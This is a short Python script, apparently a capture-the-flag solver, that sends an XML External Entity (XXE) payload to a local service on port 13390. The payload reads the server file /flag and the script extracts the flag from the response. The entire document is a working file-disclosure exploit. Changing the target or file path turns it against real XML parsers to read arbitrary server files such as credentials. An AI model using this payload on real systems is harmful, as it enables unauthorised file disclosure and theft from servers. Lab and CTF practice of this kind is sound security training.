#!/usr/bin/env python3
import requests

BASE = 'http://127.0.0.1:13390'
payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag">]>
<root>&xxe;</root>'''

r = requests.post(BASE, data=payload, headers={'Content-Type': 'text/plain'})
if 'flag{' in r.text:
    import re
    flag = re.search(r'flag\{[^}]+\}', r.text).group()
    print(f'[+] {flag}')
else:
    print('[-] flag not found')
